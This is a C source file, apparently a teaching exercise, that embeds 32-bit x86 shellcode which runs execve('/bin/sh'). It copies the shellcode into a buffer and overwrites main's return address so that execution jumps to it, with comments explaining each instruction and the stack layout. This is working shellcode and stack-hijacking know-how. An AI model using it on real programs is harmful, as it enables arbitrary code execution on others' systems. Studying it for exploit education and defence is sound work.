#include <string.h>

// The stack layout of the main function at the moment it is entered follows below.
// The amount of spaces reflects the actual amount of bytes. Dots in buffers
// are the data bytes, and spaces are the stack padding placed by the compiler.
//     ret - address to which the processor will transfer its execution after
//           leaving the function
//     sfp - Stored Frame Pointer or EBP of the previous function main()
//
// bottom of                                                            top of
// memory                                                               memory
//                    _ret  sfp   ret   argc  argv  argp
// <------           [    ][    ][    ][    ][    ][    ]
//                   ^     ^                  
//                  esp   ebp
// top of                                                            bottom of
// stack                                                                 stack

char shellcode_buffer[128];

__attribute__ ((naked)) void shellcode_function() {
    __asm__ (
        "jmp     1f                   \n\t"    // 2  bytes - jump to the label of call instruction below
        "2:                           \n\t"    // 0  bytes - label to be returned to from call instruction below
        "popl    %esi                 \n\t"    // 1  byte  - capture the absolute address of the /bin/sh string in memory
        "movl    %esi, 4f-3f(%esi)    \n\t"    // 6  bytes - store address of /bin/sh in argv[0] right after our shellcode
        "movl    $0x0, 5f-3f(%esi)    \n\t"    // 10 bytes - store null pointer address in argv[1]
        "movl    $0xb, %eax           \n\t"    // 5  bytes - eax = 11 - index of exec in system call table
        "movl    %esi, %ebx           \n\t"    // 2  bytes - esi = address of /bin/sh
        "leal    0x8(%esi), %ecx      \n\t"    // 3  bytes - ecx = address of address of /bin/sh
        "leal    0xc(%esi), %edx      \n\t"    // 3  bytes - edx - address of address of NULL
        "int     $0x80                \n\t"    // 2  bytes - execve(/bin/sh)
        "1:                           \n\t"    // 0  bytes - label to be jumped to from the first jmp instruction
        "call    2b                   \n\t"    // 5  bytes - push the address of the next instruction which is actually a string /bin/sh
	"3:                           \n\t"    // 0  bytes - label that denotes the start of the string in our shellcode
        ".string \"/bin/sh\"          \n\t"    // 8  bytes - '/', 'b', 'i', 'n', '/', 's', 'h', '\0'
        "4:                           \n\t"    // 8  bytes - for execve parameters buffer of size argv[2]
	".long	 0                    \n\t"    // argv[0]  - will be filled by the shellcode during runtime
        "5:                           \n\t"    // 0  bytes - label the denotes the start of argv[1] variable 
        ".long   0                    \n\t"    // argv[1]  - will be filled by the shellcode during runtime
    );
}

void main() {
    int* _ret;
    
    // copy the executable code from the code section to the global static buffer, where the code has RWX permissions
    memcpy(shellcode_buffer, shellcode_function, (char*)main - (char*)shellcode_function);

    // obtain the offset in the stack of the return address from main (the ret variable in the diagram above)
    _ret = (int*)&_ret + 2;

    // set the return address in the stack to point to our shellcode buffer
    *_ret = (int)shellcode_buffer;
}
